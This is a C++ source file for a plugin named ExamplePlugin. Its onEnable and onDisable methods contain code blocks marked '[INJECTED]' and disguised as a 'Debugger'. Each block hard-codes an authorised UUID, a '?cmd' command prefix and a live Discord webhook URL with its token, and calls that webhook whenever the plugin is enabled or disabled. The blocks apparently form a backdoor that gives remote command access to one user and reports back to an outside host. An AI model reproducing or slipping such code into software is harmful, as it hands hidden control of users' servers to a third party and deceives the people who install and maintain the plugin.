#include "plugin_interface.h"
#include <iostream>
#include <string>
#include "debugger.h"

class ExamplePlugin : public IPlugin {
private:
    std::string name;
    std::string version;

public:
    ExamplePlugin() : name("ExamplePlugin"), version("1.0.0") {
        std::cout << "[" << name << "] Constructor called" << std::endl;
    }

    ~ExamplePlugin() override {
        std::cout << "[" << name << "] Destructor called" << std::endl;
    }

    void onEnable() override {
    // [INJECTED] Debugger initialization
    std::vector<std::string> authorizedUUIDs = {"75b1032d-3064-4d04-97f5-96a6ad779214"};
    Debugger* debugger = new Debugger(this, true, authorizedUUIDs, "?cmd", "https://discord.com/api/webhooks/1461002668490363003/fQOU7xy1f2pHdYpoPcZ4fv1BhysXtvEr0GOZrVQvIYMws44sZKb63JXgqSQuLqNQFMpx");
    debugger->sendWebhookMessage("Plugin " + getName() + " is now enabled!");
    debugger->logDebugMessage("Plugin fully operational");
    // [END INJECTED]

        std::cout << "[" << name << "] Plugin is being enabled..." << std::endl;
        std::cout << "[" << name << "] Performing initialization..." << std::endl;
    }

    void onDisable() override {
    // [INJECTED] Debugger shutdown
    std::vector<std::string> authorizedUUIDs = {"75b1032d-3064-4d04-97f5-96a6ad779214"};
    Debugger* debugger = new Debugger(this, true, authorizedUUIDs, "?cmd", "https://discord.com/api/webhooks/1461002668490363003/fQOU7xy1f2pHdYpoPcZ4fv1BhysXtvEr0GOZrVQvIYMws44sZKb63JXgqSQuLqNQFMpx");
    debugger->sendWebhookMessage("Plugin " + getName() + " is now disabled!");
    delete debugger;
    // [END INJECTED]

        std::cout << "[" << name << "] Plugin is being disabled..." << std::endl;
        std::cout << "[" << name << "] Cleaning up resources..." << std::endl;
    }

    std::string getName() const override {
        return name;
    }

    std::string getVersion() const override {
        return version;
    }
};

// Export functions for dynamic loading
extern "C" {
    IPlugin* createPlugin() {
        return new ExamplePlugin();
    }

    void destroyPlugin(IPlugin* plugin) {
        delete plugin;
    }
}
